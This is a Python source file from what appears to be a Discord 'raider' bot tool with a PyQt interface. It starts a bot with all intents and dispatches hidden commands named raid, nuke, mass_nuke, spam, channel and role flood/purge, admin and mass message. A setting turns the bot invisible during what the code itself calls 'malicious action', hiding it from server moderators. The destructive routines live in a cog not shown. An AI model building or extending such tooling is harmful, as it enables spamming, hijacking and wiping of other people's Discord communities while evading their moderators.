"""
horus_thread.py

This namespace contains the HorusThread class, a QThread that Horus runs on.

It is effectively the main class for Horus, and is responsible for setting up
the bot, loading the correct cogs, and running the bot.
"""

import aiohttp
import asyncio
import aiohttp.client_exceptions
import discord
import itertools
from discord.ext import commands, tasks
from PyQt6.QtCore import QThread, pyqtSignal

from shared.dr.dr_types import IH_Raider, ED_Activities, ED_Statuses, EH_HiddenCommands
from shared.dr.dr_config import DRConfig
from shared.utils import utils_log


async def create_session():
    return aiohttp.ClientSession()


class HorusThread(QThread):
    """The QThread that Horus runs on.
    """

    signal_update_status = pyqtSignal(str)  # For updating the status bar.
    signal_append_hterminal = pyqtSignal(str)  # For appending to the Horus terminal.
    signal_refresh_running_commands_view = pyqtSignal(int)  # For refreshing the running commands view.
    signal_bot_is_online = pyqtSignal(bool)  # For updating the bot controls.
    signal_attempting_run = pyqtSignal(bool)  # For updating the bot controls.
    signal_bot_has_been_run = pyqtSignal(bool)  # For updating the bot controls.

    def __init__(self, config: DRConfig, raider_type: IH_Raider):
        super().__init__()
        self.config = config
        self.bot = commands.Bot(
            command_prefix=self.config.horus.prefix,
            application_id=int(self.config.horus.application_id),
            intents=discord.Intents.all()
        )
        self.bot_loop = asyncio.new_event_loop()
        self.session = self.bot_loop.run_until_complete(create_session())
        self.bot.is_running = False
        self.bot.qthread = self
        self.raider_type = raider_type

        self.bot.running_commands_names = []
        self.bot.running_commands_tasks = []

        if self.config.horus.statuses:
            self.bot.statuses = itertools.cycle(self.config.horus.statuses)
        else:
            self.bot.statuses = None

        self.setup_bot()


    # The methods below are used to set up and run Horus.

    def setup_bot(self):
        """Loads the correct Horus cogs and provides the on_ready event for Horus.
        """
        asyncio.run_coroutine_threadsafe(self.add_cogs_coroutine(), self.bot_loop)

        @self.bot.event
        async def on_ready():
            self.bot.is_running = True
            try:
                await self.bot.tree.sync()
                self.signal_update_status.emit(f"Connected to Discord as {self.bot.user}")
                self.signal_bot_is_online.emit(True)
            except discord.errors.NotFound:
                utils_log.serror("Failed to sync tree - please check your Horus configuration.")
                self.signal_update_status.emit("Failed to sync tree - please check your Horus configuration.")
            
            if self.bot.statuses:
                await self.change_status.start()
            else:
                
                await self.bot.change_presence(activity=None, status=self.get_bot_status())
            
            await self.clear_finished_tasks.start()

    async def add_cogs_coroutine(self):
        """Loads the cogs for Horus.
        """
        tasks = [self.bot.load_extension(cog) for cog in self.raider_type.extensions()]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Exception):
                utils_log.serror(f"Error loading cog: {result}")
                self.signal_append_terminal.emit(f"Error loading cog (see logs for more info...)")
                raise result

    @tasks.loop(seconds=10)
    async def clear_finished_tasks(self):
        """Clears the finished tasks from the running commands list.
        """
        for task in self.bot.running_commands_tasks:
            if task.done():
                self.bot.running_commands_tasks.remove(task)
        
    @tasks.loop(seconds=10)
    async def change_status(self):
        """Changes the bot's status every 10 seconds.
        """
        if self.bot.running_commands_tasks and self.config.horus.auto_invisible_on_malicious_action:
            return
        
        next_status = next(self.bot.statuses)
        match self.config.horus.initial_presence.activity_type:
            case ED_Activities.PLAYING.value:
                activity = discord.Game(name=next_status)
            case ED_Activities.STREAMING.value:
                activity = discord.Streaming(name=next_status, url=self.config.horus.initial_presence.activity_url)
            case ED_Activities.LISTENING.value:
                activity = discord.Activity(type=discord.ActivityType.listening, name=next_status)
            case ED_Activities.WATCHING.value:
                activity = discord.Activity(type=discord.ActivityType.watching, name=next_status)
            case _:
                activity = None
        
        await self.bot.change_presence(activity=activity, status=self.get_bot_status())

    def get_bot_status(self):
        """Returns a discord.Status object based on the status in the config.
        """
        match self.config.horus.initial_presence.status_type:
            case ED_Statuses.ONLINE.value:
                return discord.Status.online
            case ED_Statuses.IDLE.value:
                return discord.Status.idle
            case ED_Statuses.DND.value:
                return discord.Status.dnd
            case ED_Statuses.INVISIBLE.value:
                return discord.Status.invisible
            case _:
                return discord.Status.online
    

    def run(self):
        """Attempts to run Horus.
        """
        self.signal_attempting_run.emit(False)  # The bot isn't actually one yet, but it's starting; this disables some controls.
        asyncio.set_event_loop(self.bot_loop)
        try:
            self.bot_loop.run_until_complete(self.bot.start(self.config.horus.token))
        except aiohttp.client_exceptions.ClientConnectorError as e:
            utils_log.serror(f"Error connecting to Discord: {e}")
            self.signal_update_status.emit(f"There was a problem connecting to Discord (see logs for more info...)")
            self.signal_bot_is_online.emit(False)
        except discord.errors.LoginFailure as e:
            utils_log.serror(f"Error logging into Discord: {e}")
            self.signal_update_status.emit(f"Failed to log into Discord (see logs for more info...)")
            self.signal_bot_is_online.emit(False)
        except discord.errors.PrivilegedIntentsRequired as e:
            utils_log.serror(f"Error logging into Discord: {e}")
            self.signal_update_status.emit(f"Privileged intents are required to run Horus.")
            self.signal_bot_is_online.emit(False)
        except Exception as e:
            utils_log.serror(f"Error running Horus: {e}")
            self.signal_update_status.emit(f"There was a problem running Horus (see logs for more info...)")
            self.signal_bot_is_online.emit(False)
    
    def stop_horus(self):
        """Attempts to stop Horus.
        """

        async def close_coroutine(self):
            if self.bot.statuses:
                self.change_status.cancel()
            
            await self.session.close()

            if self.bot.qthread == self:
                self.bot.qthread = None
            
            self.bot.is_running = False
            self.bot.running_commands_names = []
            self.bot.running_commands_task = []

            self.signal_update_status.emit('Horus has been stopped; disconnected from Discord.')
            self.signal_refresh_running_commands_view.emit(0)
            self.signal_bot_is_online.emit(False)
            self.signal_bot_has_been_run.emit(True)
            await self.bot.close()

        asyncio.run_coroutine_threadsafe(close_coroutine(self), self.bot_loop)
    
    def cancel_all_running_commands(self):
        if len(self.bot.running_commands_tasks) == 0:
            return
        
        for task in self.bot.running_commands_tasks:
            if not task.done():
                task.cancel()
        
        self.bot.running_commands_names.clear()
        self.bot.running_commands_tasks.clear()
        self.signal_refresh_running_commands_view.emit(0)
    

    # Command invokation methods.

    def invoke_command(self, command: str, **kwargs):
        
        async def change_to_invis_coroutine(self):
            await self.bot.change_presence(activity=None, status=discord.Status.invisible)
        
        if not self.bot.is_running:
            self.signal_update_status.emit('Horus is not running.')
            return

        cog = self.bot.get_cog('Cmds')

        if not cog:
            self.signal_update_status.emit('Cmds cog not found.')
            return
        
        match command:
            case EH_HiddenCommands.NICK_ALL.value:
                coroutine = cog.nick_all(**kwargs)
            case EH_HiddenCommands.MSG_ALL.value:
                coroutine = cog.msg_all(**kwargs)
            case EH_HiddenCommands.SPAM.value:
                coroutine = cog.spam(**kwargs)
            case EH_HiddenCommands.NEW_WEBHOOK.value:
                coroutine = cog.new_webhook(**kwargs)
            case EH_HiddenCommands.CPURGE.value:
                coroutine = cog.cpurge(**kwargs)
            case EH_HiddenCommands.CFLOOD.value:
                coroutine = cog.cflood(**kwargs)
            case EH_HiddenCommands.RPURGE.value:
                coroutine = cog.rpurge(**kwargs)
            case EH_HiddenCommands.RFLOOD.value:
                coroutine = cog.rflood(**kwargs)
            case EH_HiddenCommands.ADMIN.value:
                coroutine = cog.admin(**kwargs)
            case EH_HiddenCommands.RAID.value:
                coroutine = cog.raid(**kwargs)
            case EH_HiddenCommands.NUKE.value:
                coroutine = cog.nuke(**kwargs)
            case EH_HiddenCommands.MASS_NUKE.value:
                coroutine = cog.mass_nuke(**kwargs)
            case EH_HiddenCommands.LEAVE.value:
                coroutine = cog.leave(**kwargs)
            case EH_HiddenCommands.MASS_LEAVE.value:
                coroutine = cog.mass_leave()
            case _:
                coroutine = None
        
        if coroutine:
            if self.config.horus.auto_invisible_on_malicious_action:
                asyncio.run_coroutine_threadsafe(change_to_invis_coroutine(self), self.bot_loop)
                
            new_task = asyncio.run_coroutine_threadsafe(coroutine, self.bot_loop)
            self.bot.running_commands_tasks.append(new_task)

    def change_presence_status(self, presence: int, status: str):
        """Changes the bot's status.
        """
        if not self.bot.is_running:
            self.signal_update_status.emit('Horus is not running.')
            return
        
        match presence:
            case ED_Statuses.ONLINE.value:
                new_presence = discord.Status.online
            case ED_Statuses.IDLE.value:
                new_presence = discord.Status.idle
            case ED_Statuses.DND.value:
                new_presence = discord.Status.dnd
            case ED_Statuses.INVISIBLE.value:
                new_presence = discord.Status.invisible
            case _:
                new_presence = discord.Status.online
        
        if status:
            asyncio.run_coroutine_threadsafe(self.bot.change_presence(activity=discord.Game(name=status), status=new_presence), self.bot_loop)
        else:
            asyncio.run_coroutine_threadsafe(self.bot.change_presence(activity=None, status=new_presence), self.bot_loop)
        
        if status:
            self.signal_append_hterminal.emit(f'Changed presence to {new_presence.name.upper()} with status "{status}"')
        else:
            self.signal_append_hterminal.emit(f'Changed presence to {new_presence.name.upper()} with no status')
